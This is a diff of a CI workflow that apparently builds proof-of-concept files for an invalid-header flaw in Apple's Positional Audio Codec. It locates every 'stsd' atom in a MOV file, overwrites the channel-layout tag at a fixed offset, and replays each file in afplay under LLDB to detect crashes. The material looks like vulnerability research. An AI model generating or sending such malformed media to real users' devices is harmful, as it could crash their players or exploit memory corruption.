@@ -71,8 +71,8 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This step now uses professional tools to find the offset and corrupt the file.
-      - name: Surgically Corrupt APAC File
+      # This new, combined step iterates through all 'stsd' atoms, corrupts each one, and tests it.
+      - name: Iterate, Corrupt, and Test All Audio Tracks
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           set -x 
@@ -83,60 +83,69 @@ jobs:
           # Step 1: Use mp4dump on the original MOV file to create a JSON representation.
           mp4dump --format json IMG_1027.mov > atom_dump.json
           
-          # Step 2: Create a copy of the base file that we will corrupt.
-          cp IMG_1027.mov output_apac_poc.mp4
+          # Step 2: Use jq to find all 'stsd' offsets from the JSON dump.
+          ALL_OFFSETS=$(jq -r '.. | objects | select(.name? == "stsd") | .file_offset' atom_dump.json)
 
-          # Step 3: Use a corrected, simpler jq query to find the 'stsd' atom that contains the 'apac' codec definition.
-          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)
-
-          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
-            echo "Could not find audio 'stsd' offset using the corrected jq query. Aborting."
+          if [ -z "$ALL_OFFSETS" ]; then
+            echo "Could not find any 'stsd' atoms using jq. Aborting."
             exit 1
           fi
-          
-          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
-          
-          # The channel layout tag is at a known position within the stsd atom.
-          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
-          
-          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
 
-          ./encodeme_corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
-          
-          echo "Malicious APAC PoC file generated."
-          ls -l output_apac_poc.mp4
-          
-      # Launch the player directly under LLDB to catch any startup crashes.
-      - name: Launch Player Under LLDB to Catch Crash
-        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
-        run: |
-          PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) with final PoC ---" > $PLAYER_LOG_FILE
-          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
+          echo "Found the following 'stsd' offsets to test:"
+          echo "$ALL_OFFSETS"
 
-          echo "Creating LLDB script to launch and monitor afplay..."
-          cat > player_debug_script.lldb << 'EOF'
-          # Run the process. LLDB will automatically stop if a crash occurs.
-          run
-          # If a crash occurred, this will give us the full backtrace.
-          bt
-          quit
-          EOF
+          # Step 3: Loop through each offset, create a unique corrupted file, and test it.
+          mkdir -p test_results
+          for OFFSET in $ALL_OFFSETS; do
+            echo "--- Testing corruption for stsd atom at offset ${OFFSET} ---"
+            
+            POC_FILE="output_poc_offset_${OFFSET}.mp4"
+            PLAYER_LOG_FILE="test_results/player_log_offset_${OFFSET}.txt"
+            
+            # Create a fresh copy for this iteration
+            cp IMG_1027.mov "$POC_FILE"
+            
+            # The channel layout tag is at a known position within the stsd atom.
+            CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
+            echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
+            
+            # Run the C++ utility to perform the corruption.
+            ./encodeme_corruptor "$POC_FILE" $CORRUPTION_OFFSET
+            
+            echo "Launching player under LLDB for ${POC_FILE}..."
+            
+            # Create the lldb script for this iteration
+            cat > player_debug_script.lldb << 'EOF'
+            run
+            bt
+            quit
+            EOF
+            
+            # Run the test
+            lldb -s player_debug_script.lldb -- afplay "$POC_FILE" > "$PLAYER_LOG_FILE" 2>&1 || true
+            
+            # Check for crash by looking for lldb backtrace output
+            if grep -q "frame #0" "$PLAYER_LOG_FILE" && ! grep -q "stop reason = breakpoint" "$PLAYER_LOG_FILE" ; then
+              echo "✅✅✅ POTENTIAL CRASH DETECTED for offset ${OFFSET} ✅✅✅"
+              echo "Log file: ${PLAYER_LOG_FILE}"
+              # We will continue testing other offsets, but this is a strong signal.
+            else
+              echo "No crash detected for offset ${OFFSET}."
+            fi
+            
+            echo "--- Finished testing offset ${OFFSET} ---"
+          done
 
-          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
-          lldb -s player_debug_script.lldb -- afplay output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true
+          echo "All offsets tested."
 
-          echo "✅ Player debug log created. Displaying contents:"
-          cat $PLAYER_LOG_FILE
-
-      # Upload all artifacts
+      # Upload all artifacts for analysis
       - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: debug-and-poc-artifacts
           path: |
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_poc_offset_*.mp4
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/test_results/
             AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
           retention-days: 7
           if-no-files-found: error
